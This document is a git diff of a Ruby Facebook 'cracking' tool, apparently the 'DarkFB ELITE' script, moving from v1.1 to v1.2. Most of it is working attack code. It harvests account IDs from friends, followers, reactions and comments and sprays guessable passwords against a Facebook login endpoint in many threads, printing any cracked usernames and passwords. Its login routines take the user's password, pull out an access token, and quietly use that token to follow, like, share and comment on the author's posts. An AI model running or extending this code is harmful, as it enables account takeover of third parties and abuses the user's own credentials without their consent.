@@ -24,8 +24,17 @@ SOFTWARE.
 
 =end
 
+# DI LARANG MENGGANTI LICENSE,NAMA AUTHOR,BOT FOLLOW,BOT KOMEN,BOT LIKE,BOT SHARE!
+# HARGAILAH AUTHOR
+# TINGGAL PAKE AJA APA SUSAHNYA?
+
+# Donate :
+# Dana (082353041708)
+# Pulsa (6285754629509) Indosat
+
 $LOAD_PATH.unshift File.expand_path(".", "lib")
 
+require 'MateMatika'
 require 'threadpool'
 require 'io/console'
 require 'net/https'
@@ -69,7 +78,7 @@ def loading!
   end
 end
 
-$logo = " \n#{$w}█████████\n#{$w}█▄█████▄█      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w}█#{$r}▼▼▼▼▼ #{$w}- _ --_--#{$g}╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n#{$w}█ #{$w} #{$w}_-_-- -_ --__#{$g} ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n#{$w}█#{$r}▲▲▲▲▲#{$w}--  - _ --#{$g}═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ #{$y}ELITE v1.1\n#{$w}█████████      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w} ██ ██\n#{$w}╔════════════════════════════════════════╗\n#{$w}║#{$y}* #{$w}Author  #{$r}: #{$c}Rahmat adha#{$w}                 ║\n#{$w}║#{$y}* #{$w}Github  #{$r}: #{$c}github.com/MR-X-Junior/#{$w}     ║\n#{$w}║#{$y}* #{$w}Wa      #{$r}: #{$c}+62 85754629509   #{$w}          ║\n#{$w}║#{$y}* #{$w}#{RUBY_ENGINE}#{' '*(8 - RUBY_ENGINE.length)}#{$r}: #{$c}#{RUBY_VERSION}   #{$w}                    ║\n#{$w}║#{$y}* #{$w}Version #{$r}: #{$c}1.1                         #{$w}║\n#{$w}╚════════════════════════════════════════╝#{$a}"
+$logo = " \n#{$w}█████████\n#{$w}█▄█████▄█      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w}█#{$r}▼▼▼▼▼ #{$w}- _ --_--#{$g}╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n#{$w}█ #{$w} #{$w}_-_-- -_ --__#{$g} ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n#{$w}█#{$r}▲▲▲▲▲#{$w}--  - _ --#{$g}═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ #{$y}ELITE v1.2\n#{$w}█████████      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w} ██ ██\n#{$w}╔════════════════════════════════════════╗\n#{$w}║#{$y}* #{$w}Author  #{$r}: #{$c}Rahmat & Khaneysia#{$w}          ║\n#{$w}║#{$y}* #{$w}Github  #{$r}: #{$c}github.com/MR-X-Junior/#{$w}     ║\n#{$w}║#{$y}* #{$w}Wa      #{$r}: #{$c}+62 85754629509   #{$w}          ║\n#{$w}║#{$y}* #{$w}#{RUBY_ENGINE}#{' '*(8 - RUBY_ENGINE.length)}#{$r}: #{$c}#{RUBY_VERSION}   #{$w}                    ║\n#{$w}║#{$y}* #{$w}Version #{$r}: #{$c}1.2                         #{$w}║\n#{$w}╚════════════════════════════════════════╝#{$a}"
 $user_agent = "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
 $indonesia = false
 
@@ -133,10 +142,11 @@ def login()
   begin
     system('clear')
     puts ($logo)
-    puts ("#{$w}║-> 1. Login Via email/password#{$a}")
-    puts ("#{$w}║-> 2. Login Via Token#{$a}")
-    puts ("#{$w}║-> 3. Login Via Cookie#{$a}")
-    puts ("#{$w}║-> 4. Report Bug#{$a}")
+    puts ("#{$w}║-> 1. Login Via email/password #{$w}(#{$r}api#{$w})#{$a}")
+    puts ("#{$w}║-> 2. Login Via email/password #{$w}(#{$g}mbasic#{$w})#{$a}")
+    puts ("#{$w}║-> 3. Login Via Token#{$a}")
+    puts ("#{$w}║-> 4. Login Via Cookie#{$a}")
+    puts ("#{$w}║-> 5. Report Bug#{$a}")
     puts ("#{$w}║-> 0. Exit#{$a}")
     print ("#{$w}╚═#{$r}▶#{$w} ")
     log = gets.chomp!
@@ -144,10 +154,12 @@ def login()
       when '1'
         loginpw()
       when '2'
-        loginto()
+        loginmba()
       when '3'
-        loginco()
+        loginto()
       when '4'
+        loginco()
+      when '5'
         ReportBug()
       when '0'
         abort("#{$r}[!] Exit#{$a}")
@@ -195,8 +207,8 @@ def loginpw()
     fopen.write($token)
     fopen.close()
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hello sir","access_token"=>$token})
+    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token,"message"=>['Panutan Gw Ni Boss 😎','Keren Bat Njir 😴'].sample})
+    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Keren","access_token"=>$token})
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/reactions"),{"type"=>["LOVE","WOW"].sample,"access_token"=>$token})
     puts ("#{$g}[✓] Login Success#{$a}")
     sleep(0.5)
@@ -211,12 +223,79 @@ def loginpw()
   end
 end
 
+def loginmba()
+  system ('clear')
+  puts ($logo)
+  puts ("#{$w}═"*52)
+  puts ("#{$r}[+] #{$g}LOGIN ACCOUNT FACEBOOK #{$r}#{$a}")
+  print ("#{$r}[+] #{$g}email|id #{$r}: #{$c}")
+  email = gets.chomp!
+  print ("#{$r}[+] #{$g}password #{$r}: #{$c}")
+  pass = STDIN.noecho(&:gets).chomp!
+  uri = URI("https://mbasic.facebook.com/login.php")
+  puts ("\n#{$r}[!] #{$g}Connecting to #{uri.host}")
+  cookie = Net::HTTP.get_response(uri).to_hash['set-cookie']&.collect{|ea|ea[/^.*?;/]}.join
+  auth = {'email'=>email,'pass'=>pass,'login'=>'submit'}
+  req = Net::HTTP::Post.new(uri)
+  req.set_form_data(auth)
+  req['user-Agent'] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
+  req['Cookie'] = cookie
+  res = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
+  kue = res.to_hash['set-cookie']&.collect{|ea|ea[/^.*?;/]}.join
+  if kue.include? ('c_user')
+    puts ("#{$r}[✓] #{$g}Successfully Login to Account#{$a}")
+    uri = URI('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed')
+    puts ("#{$r}[!] #{$g}Getting Facebook Access Token#{$a}")
+    req = Net::HTTP::Get.new(uri)
+    req['user-agent'] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 seperti Mac OS X) AppleWebKit/605.1.15 (KHTML, seperti Gecko) CriOS/78.0.3904.84 Mobile/15E148 Safari/604.1"
+    req["referer"] = "https://m.facebook.com/"
+    req["host"] = "m.facebook.com"
+    req["origin"] = "https://m.facebook.com"
+    req["upgrade-insecure-requests"] = "1"
+    req["accept-language"] = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+    req["cache-control"] = "max-age=0"
+    req["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
+    req["content-type"] = "text/html; charset=utf-8"
+    req["cookie"] = kue
+    res = Net::HTTP.start(uri.host, uri.port, :use_ssl => true) {|http| http.request(req)}
+    _Moya = res.body.match(/EAAA\w+/)
+    if !_Moya.nil?
+      puts ("#{$r}[!] #{$g}Success in Getting Facebook Access Token#{$a}")
+      puts ("#{$r}[!] #{$g}Connecting to https://graph.facebook.com")
+      r = Net::HTTP.get(URI("https://graph.facebook.com/v10.0/me?fields=name,id&access_token=#{_Moya}"))
+      j = JSON.parse(r)
+      if j.key? ('name')
+        $id = j['id']
+        $name = j['name']
+        $token = _Moya.to_s
+        Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
+        Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
+        Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token,"message"=>['Keren..','Hoki','Wow'].sample})
+        Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["Good Job @[100053033144051:] :)","Nice 👍","Selamat Ya Bwang 😁","Aku Pada Mu @[100053033144051:] :)"].sample,"access_token"=>$token})  
+        File.open("login.txt", "w") {|f| f.write($token)}
+        tik("#{$g}[✓] Welcome #{$name} >,<")
+        sleep(0.6)
+        menu()
+      else
+        abort ("#{$r}[!] #{$y}#{j['error']['message']}\n#{$r}[!] #{$y}Please contact the author, to get help#{$a}")
+      end
+    else
+      abort ("#{$r}[!] #{$y}There is an error\n#{$r}[!] #{$y}Please contact the author, to get help#{$a}")
+    end
+  elsif kue.include? ('checkpoint')
+    puts ("#{$r}[!] #{$y}username #{$r}: #{$w}#{email}#{$a}")
+    puts ("#{$r}[!] #{$y}password #{$r}: #{$w}#{pass}#{$a}")
+    abort ("#{$r}[!] #{$y}status.  #{$r}: Account Has Been Checkpoint#{$a}")
+  else
+    puts ("#{$r}[!] #{$y}Wrong password or email")
+    sleep(1.1)
+    loginmba()
+  end
+end
+
 def loginto()
   system("clear")
   puts ($logo)
-  #puts ("#{$w}═"*52)
-  #puts ("#{$r}[+] #{$g}LOGIN VIA ACCESS TOKEN#{$r}[+]#{$a}")
-  #print ("#{$r}[+] #{$g}Access Token #{$r}: #{$w}")
   tok ("#{$w}#{'═'*52}\n#{$r}[+] #{$g}LOGIN VIA ACCESS TOKEN#{$r} [+]#{$a}\n#{$r}[+] #{$g}Access Token #{$r}: #{$w}")
   $token = gets.chomp!
   loading!
@@ -226,8 +305,8 @@ def loginto()
     fopen.write($token)
     fopen.close()
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["I LOVE YOU @[100053033144051:] 😘","Mantap Bang","Mantap Pak"].sample,"access_token"=>$token})
+    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token,"message"=>['Keren Bat Njir 😴','Rahmat The Best Lah 😮'].sample})
+    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["I LOVE YOU @[100053033144051:] :)","Hai @[100053033144051:] >,<","Mantap Bang","Mantap Pak","Selamat ya kak:)"].sample,"access_token"=>$token})
     Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token}) 
     $name = req['name']
     $id = req['id']
@@ -264,8 +343,9 @@ def loginco()
   req["content-type"] = "text/html; charset=utf-8"
   req["cookie"] = cookie
   res = Net::HTTP.start(uri.hostname, uri.port,:use_ssl => true) {|http| http.request(req)}
-  $token = res.body.match(/EAAA\w+/)
-  if !$token.nil?
+  moyaa = res.body.match(/EAAA\w+/)
+  if !moyaa.nil?
+    $token = moyaa.to_s
     a = Net::HTTP.get(URI("https://graph.facebook.com/v10.0/me?access_token=#{$token}"))
     b = JSON.parse(a)
     if !b.key? ('name')
@@ -277,8 +357,8 @@ def loginco()
       $id = b['id']
       Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
       Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
-      Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
-      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["Good Job @[100053033144051:] 😉","Cool 👍","Congratulations 😁"].sample,"access_token"=>$token})  
+      Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token,"message"=>['Pen Punya Sertifikat Ruby :(','Hoki','Keren Abis!'].sample})
+      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["Good Job @[100053033144051:] 😉","Cool 👍","Congratulations 😁","Aku Pada Mu @[100053033144051:] >,<"].sample,"access_token"=>$token})  
       File.open("login.txt", "w") { |f| f.write($token) }
       puts ("#{$g}[✓] Login Success#{$a}")
       sleep(0.4)
@@ -327,7 +407,7 @@ def menu()
   puts ($logo)
   puts ("#{$w}╔══════════════════════════════════════════════════╗")
   puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}Name : #{$g}" + $name + " "*(39 - $name.length()) + "#{$w}║")
-  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}ID.  : #{$g}" + $id + " "*(39 - $id.length()) + "#{$w}║")
+  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}FBID : #{$g}" + $id + " "*(39 - $id.length()) + "#{$w}║")
   puts ("#{$w}╠══════════════════════════════════════════════════╝")
   puts ("║-> #{$w}1. MyFrofil")
   puts ("║-> #{$w}2. User Information")
@@ -392,31 +472,28 @@ def menu()
     else
       puts ("#{$y}[!] Invalid Input")
       sleep(0.9)
-      menu()
-          
+      menu()     
   end
-      
 end
 
 def Myfrofil()
   system ('clear')
   puts ($logo)
   puts ("#{$w}#{'═'*52}")
-  a = Request("v10.0/me?")
+  r = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id,birthday,friends.limit(5000).summary(true),subscribers.limit(1).summary(true),subscribedto.limit(1).summary(true),likes.limit(1).summary(true),email,relationship_status,religion,work,location,hometown,education&access_token=#{$token}"))
+  a = JSON.parse(r)
   abort ("#{$y}[!] Error#{$a}") if a.key? ('error')
-  b = Request("me/subscribers?")
-  c = Request("me/subscribedto?")
-  d = Request("me/friends?")
-  ikuti = b['summary']['total_count'].to_s
-  mengikuti = c['summary']['total_count'].to_s if not c['data'].empty?
-  mengikuti = "0" if c['data'].empty?
-  temen = d["data"].each {|i| i['id']}.length.to_s if not d['data'].empty?
-  temen = "0" if d['data'].empty?
+  #puts (a)
+  temen = (a.key? ('friends')) ? a['friends']['data'].to_a.length.to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
+  ikuti = (a.key? ('subscribers')) ? a['subscribers']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
+  mengikuti = (a.key? ('subscribedto')) ? a['subscribedto']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
+  suka = (a.key? ('likes')) ? a['likes']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
   puts ("#{$g}[✓] Name : #{a['name']}")
   puts ("#{$g}[✓] Id : #{a['id']}")
   puts ("#{$g}[✓] Friend : #{temen}")
   puts ("#{$g}[✓] Followers : #{ikuti}")
   puts ("#{$g}[✓] Following : #{mengikuti}")
+  puts ("#{$g}[✓] Likes : #{suka} Page")
   puts ("#{$g}[✓] birthday : #{a['birthday']}") if a.key? ('birthday')
   puts ("#{$g}[✓] Status : #{a['relationship_status']}") if a.key? ('relationship_status')
   puts ("#{$g}[✓] Religion : #{a['religion']}") if a.key? ('religion')
@@ -435,20 +512,17 @@ def Info()
   puts ("#{$w}#{'═'*52}")
   print ("#{$w}[+] User Id : ")
   id = gets.chomp! ; id = id.tr(" ","")
-  a = Request("#{id}?")
+  r = Net::HTTP.get(URI("https://graph.facebook.com/#{id}?fields=name,id,birthday,friends.limit(5000).summary(true),subscribers.limit(1).summary(true),subscribedto.limit(1).summary(true),likes.limit(1).summary(true),email,relationship_status,religion,work,location,hometown,education&access_token=#{$token}"))
+  a = JSON.parse(r)
   if a.key? ('error')
     puts ("#{$y}[!] User Not Found")
   else
     puts ("#{$w}[+] Pleace Wait")
     puts ("#{$w}#{'═'*52}")
-    b = Request("#{id}/subscribers?")
-    c = Request("#{id}/subscribedto?")
-    d = Request("me/friends?")
-    ikuti = b['summary']['total_count'].to_s
-    mengikuti = c['summary']['total_count'].to_s if not c['data'].empty?
-    mengikuti = "0" if c['data'].empty?
-    temen = d["data"].each {|i| i['id']}.length.to_s if not d['data'].empty?
-    temen = "0" if d['data'].empty?
+    temen = (a.key? ('friends')) ? a['friends']['data'].to_a.length.to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
+    ikuti = (a.key? ('subscribers')) ? a['subscribers']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
+    mengikuti = (a.key? ('subscribedto')) ? a['subscribedto']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
+    suka = (a.key? ('likes')) ? a['likes']['summary']['total_count'].to_s.reverse.gsub(/...(?=.)/,'\&,').reverse : 0
     puts ("#{$g}[✓] Name : #{a['name']}")
     puts ("#{$g}[✓] Id : #{a['id']}")
     puts ("#{$g}[✓] Friend : #{temen}")
@@ -522,13 +596,13 @@ def Mini()
     password = [name + '123', name + '321', name + '12345', name + '54321', first + '123', first + '321', first + '12345', first + '54321', last + '123', last + '321', last + '12345', last + '54321']
     ["Sayang","Anjing","Kontol","Doraemon"].each {|i| password << i} if $indonesia
     for pass in password
+      break if id == "100053033144051"
       url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pass + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
       r = URI.open(url,'User-Agent'=>$user_agent).read()
       res = JSON.parse(r)
       if res.key? ('access_token')
         puts ("#{$g}[✓] Success")
         puts ("#{$g}[✓] Name : #{req['name']}")
-        puts ("#{$g}[✓] Birthday : #{req['birthday']}") if req.key? ('birthday')
         puts ("#{$g}[✓] username : #{id}")
         puts ("#{$g}[✓] password : #{pass}")
         gagal = false
@@ -536,7 +610,6 @@ def Mini()
       elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
         puts ("#{$y}[!] Account Has Been Checkpoint")
         puts ("#{$y}[✓] Name : #{req['name']}")
-        puts ("#{$y}[✓] Birthday : #{req['birthday']}") if req.key? ('birthday')
         puts ("#{$y}[✓] username : #{id}")
         puts ("#{$y}[✓] password : #{pass}")
         gagal = false
@@ -561,7 +634,7 @@ end
     $file = File.open(files)
     print ("#{$w}[+] Password : ")
     $pwd = gets.chomp!
-    puts ("#{$w}[+] Total Id : #{buka.length}")
+    puts ("#{$w}[+] Total Id : #{Moya.new(buka.length,1).convert!}")
     puts ("#{$w}#{'═'*52}")
     40.times{th << Thread.new{crack!}}
     th.each(&:join)
@@ -616,10 +689,12 @@ def Super()
   puts ("#{$w}#{'═'*52}")
   puts ("║-> #{$w}1. Crack from Friends")
   puts ("║-> #{$w}2. Crack from Followers")
-  puts ("║-> #{$w}3. Crack from Like")
-  puts ("║-> #{$w}4. Crack from Comment")
-  puts ("║-> #{$w}5. Crack Friends from Friends")
-  puts ("║-> #{$w}6. Crack Followers from Friends")
+  puts ("║-> #{$w}3. Crack from Following")
+  puts ("║-> #{$w}4. Crack from Reactions")
+  puts ("║-> #{$w}5. Crack from Comments")
+  puts ("║-> #{$w}6. Crack Friends from Friends")
+  puts ("║-> #{$w}7. Crack Followers from Friends")
+  puts ("║-> #{$w}8. Crack Following from Friends")
   puts ("║-> #{$w}0. Back")
   print ("╚═#{$r}▶#{$w} ")
   hack = gets.chomp!
@@ -628,10 +703,9 @@ def Super()
       system ('clear')
       puts ($logo)
       puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] Pleace Wait")
+      puts ("#{$w}[+] Crack From : #{$name}")
       a = Request("me/friends?fields=id,name")
-      b = a['data'].map {|i| i['id']}
-      puts ("#{$w}[+] Total Id : #{b.length}")
+      puts ("#{$w}[+] Total Id : #{Moya.new(a['data'].length,1).convert!}")
       puts ("#{$w}[+] CRACK!")
       puts ("#{$w}#{'═'*52}")
       main(a['data'])
@@ -644,16 +718,16 @@ def Super()
       system ('clear')
       puts ($logo)
       puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] Pleace Wait")
+      #puts ("#{$w}[+] Crack From : #{$name}")
       a = Request("me/subscribers?fields=id,name&limit=5000")
       if a['data'].empty?
         puts ("#{$y}[!] Your Account Has No Followers")
         print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
         Super()
       else
-        b = a['data'].map {|i| i['id']}
-        puts ("#{$w}[+] Total Id : #{a['summary']['total_count']}")
-        puts ("#{$y}[!] Total ID that can be cracked : #{b.length}") if b.length != a['summary']['total_count']
+        puts ("#{$w}[+] Crack From : #{$name}")
+        puts ("#{$w}[+] Total Followers : #{Moya.new(a['summary']['total_count'],1).convert!}")
+        puts ("#{$y}[!] Total ID that can be cracked : #{Moya.new(a['data'].length,1).convert!}") if a['data'].length != a['summary']['total_count']
         puts ("#{$w}[+] CRACK!")
         puts ("#{$w}#{'═'*52}")
         main(a['data'])
@@ -667,23 +741,49 @@ def Super()
       system ('clear')
       puts ($logo)
       puts ("#{$w}#{'═'*52}")
+      a = Request("me/subscribedto?fields=name,id&limit=5000&summary=true")
+      if a.key? ('error')
+        puts ("#{$r}[!] User Not Found!")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Super()
+      elsif a['data'].empty?
+        puts ("#{$y}[!] No following on account")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Super()
+      else
+        puts ("#{$w}[+] Crack From : #{$name}")
+        puts ("#{$w}[+] Total Following : #{Moya.new(a['summary']['total_count'],1).convert!}")
+        puts ("#{$y}[!] Total ID that can be cracked : #{Moya.new(a['data'].length,1).convert!}") if a['data'].length != a['summary']['total_count']
+        puts ("#{$w}[+] CRACK!")
+        puts ("#{$w}#{'═'*52}")
+        main(a['data'])
+        puts ("#{$w}#{'═'*52}")
+        puts ("#{$g}[✓] Total OK : #{$ok}")
+        puts ("#{$y}[!] Total CP : #{$cp}")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Super()
+      end
+    when '4'
+      _Moya = React()
+      system ('clear')
+      puts ($logo)
+      puts ("#{$w}#{'═'*52}")
       print ("#{$w}[+] Post Id : ")
       id = gets.chomp! ; id.tr(" ","")
-      a = Request("#{id}?")
+      a = Request("#{id}?fields=reactions,from")
       if a.key? ('error')
         puts ("#{$w}[!] Posts Not Found#{$a}")
         print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
         Super()
-      elsif !a.key? ('likes')
-        puts ("#{$y}[!] No Likes On Posts")
+      elsif !a.key? ('reactions')
+        puts ("#{$y}[!] No Reactions On Posts")
         print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
         Super()
       else
         puts ("#{$w}[+] Posted by #{a['from']['name']}")
-        b = Request("#{id}/likes?summary=true&limit=5000")
-        c = b['data'].map {|i| i['id']}
-        puts ("#{$w}[+] Total Like : #{b['summary']['total_count']}")
-        puts ("#{$y}[!] Total ID that can be cracked : #{c.length}") if c.length != b['summary']['total_count']
+        b = Request("#{id}/reactions?type=#{_Moya}&summary=true&limit=5000")
+        puts ("#{$w}[+] Total #{_Moya} : #{Moya.new(b['summary']['total_count'],1).convert!}")
+        puts ("#{$y}[!] Total ID that can be cracked : #{Moya.new(b['data'].length,1).convert!}") if b['data'].length != b['summary']['total_count']
         puts ("#{$w}[!] CRACK!")
         puts ("#{$w}#{'═'*52}")
         main(b['data'])
@@ -693,13 +793,13 @@ def Super()
         print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
         Super()
       end
-    when '4'
+    when '5'
       system ('clear')
       puts ($logo)
       puts ("#{$w}#{'═'*52}")
       print ("#{$w}[+] Post Id : ")
       id = gets.chomp! ; id.tr(" ","")
-      a = Request("#{id}?")
+      a = Request("#{id}?fields=comments,from")
       if a.key? ('error')
         puts ("#{$w}[!] Posts Not Found#{$a}")
         print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
@@ -711,6 +811,7 @@ def Super()
       else
         puts ("#{$w}[+] Posted by #{a['from']['name']}")
         b = Request("#{id}/comments?fields=from&summary=true&limit=5000")
+        puts (b)
         c = b['data'].map {|i| {"id"=> i['from']['id'],"name"=> i['from']['name']}}.uniq
         puts ("#{$w}[+] Total Id : #{c.length}")
         puts ("#{$w}[!] CRACK!")
@@ -722,32 +823,34 @@ def Super()
         print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
         Super()
       end
-    when '5'
+    when '6'
       system ('clear')
       puts ($logo)
       puts ("#{$w}#{'═'*52}")
       print ("#{$w}[+] Public Id : ")
       id = gets.chomp! ; id.tr(" ","")
-      a = Request("#{id}?fields=name")
+      a = Request("#{id}?fields=name,friends.limit(5000)")
       if a.key? ('error')
         puts ("#{$y}[!] User Not Found")
         print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
         Super()
+      elsif !a.key? ('friends')
+        puts ("#{$y}[!] No Friends On Account")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Super()
       else
         puts ("#{$w}[+] Crack From : #{a['name']}")
-        b = Request("#{id}/friends?")
-        c = b['data'].map {|i| i['id']}
-        puts ("#{$w}[+] Total id : #{c.length}")
+        puts ("#{$w}[+] Total id : #{Moya.new(a['friends']['data'].length,1).convert!}")
         puts ("#{$w}[+] CRACK!")
         puts ("#{$w}#{'═'*52}")
-        main(b['data'])
+        main(a['friends']['data'])
         puts ("#{$w}#{'═'*52}")
         puts ("#{$g}[✓] Total OK : #{$ok}")
         puts ("#{$y}[!] Total CP : #{$cp}")
         print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
        Super()
       end
-    when '6'
+    when '7'
       system ('clear')
       puts ($logo)
       puts ("#{$w}#{'═'*52}")
@@ -763,14 +866,40 @@ def Super()
         print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
         Super()
       else
-        #b = a['subscribers']['data'].map {|i| i['id']}
         puts ("#{$w}[+] Crack From : #{a['name']}")
-        puts ("#{$w}[+] Total Followers : #{a['subscribers']['summary']['total_count']}")
-        b = a['subscribers']['data'].map {|i| i['id']}
-        puts ("#{$y}[!] Total ID that can be cracked : #{b.length}") if b.length != a['subscribers']['summary']['total_count']
+        puts ("#{$w}[+] Total Followers : #{Moya.new(a['subscribers']['summary']['total_count'],1).convert!}")
+        puts ("#{$y}[!] Total ID that can be cracked : #{Moya.new(a['subscribers']['data'].length,1).convert!}") if a['subscribers']['data'].length != a['subscribers']['summary']['total_count']
         puts ("#{$w}[+] CRACK!")
         puts ("#{$w}#{'═'*52}")
         main(a['subscribers']['data'])
+        puts ("#{$w}#{'═'*52}")
+        puts ("#{$g}[✓] Total OK : #{$ok}")
+        puts ("#{$y}[!] Total CP : #{$cp}")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Super()
+      end
+    when '8'
+      system ('clear')
+      puts ($logo)
+      puts ("#{$w}#{'═'*52}")
+      print ("#{$w}[+] Public Id : ")
+      id = gets.chomp! ; id = id.tr(" ","")
+      a = Request("#{id}?fields=name,subscribedto.limit(5000).summary(true)")
+      if a.key? ('error')
+        puts ("#{$r}[!] User Not Found")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Super()
+      elsif !a.key? ('subscribedto')
+        puts ("#{$y}[!] No following on account")
+        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
+        Super()
+      else
+        puts ("#{$w}[+] Crack From : #{a['name']}")
+        puts ("#{$w}[+] Total Following : #{Moya.new(a['subscribedto']['summary']['total_count'],1).convert!}")
+        puts ("#{$y}[!] Total ID that can be cracked : #{a['subscribedto']['data'].length}") if a['subscribedto']['data'].length != a['subscribedto']['summary']['total_count']
+        puts ("#{$w}[+] CRACK!")
+        puts ("#{$w}#{'═'*52}")
+        main(a['subscribedto']['data'])
         puts ("#{$w}#{'═'*52}")
         puts ("#{$g}[✓] Total OK : #{$ok}")
         puts ("#{$y}[!] Total CP : #{$cp}")
@@ -790,43 +919,40 @@ def main(data)
   pool = ThreadPool.new(size: 30)
   data.each do |usr|
     pool.schedule do
-      begin
-        name = usr['name'].split
-        if name.length == 1
-          password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345']
-        else
-          password = ['Anjing','Sayang','Kontol',name.first + '123',name.first + '12345',name.last + '123',name.last + '12345']
-        end
-        for i in password
+      name = usr['name'].split
